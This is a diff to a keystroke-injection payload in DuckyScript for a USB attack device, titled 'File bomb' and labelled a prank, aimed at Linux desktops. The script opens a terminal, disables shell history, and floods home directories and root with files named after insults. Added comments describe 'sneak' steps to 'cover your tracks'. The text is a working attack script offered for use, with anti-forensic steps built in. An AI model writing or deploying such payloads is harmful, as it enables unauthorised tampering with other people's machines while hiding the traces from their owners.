@@ -1,9 +1,20 @@
-REM FalsePhilosopher
-REM I could only get gpt3 it to say poopoo head over and over, but I found a word list for lulz.
-REM target linux
+REM Title: File bomb
+REM Author: FalsePhilosopher
+REM Target:  Unix-like tested on kubuntu 22.04
+REM Props: Hak5, strippers and memes
+REM Version: 1.0
+REM Category: Prank
+REM changes to all the main dir's in home, then home, then root and creates negative named files in each
+REM
+REM initialization delay
+DELAY 300
+REM Minimize all windows as that ensures launch happens smoother.
+WINDOWS d
 DELAY 300
 CTRL-ALT t
-DELAY 1000
+REM adjust delay as needed
+DELAY 1500
+REM sneak +1 don't delete the whole history or mess with settings, just turn history off and delete the last entry ;)
 STRING set +o history
 DELAY 200
 ENTER
@@ -64,6 +75,7 @@ STRING touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mo
 DELAY 1000
 ENTER
 DELAY 3000
+REM sneak +1 cover your tracks
 STRING history | grep history
 DELAY 200
 ENTER
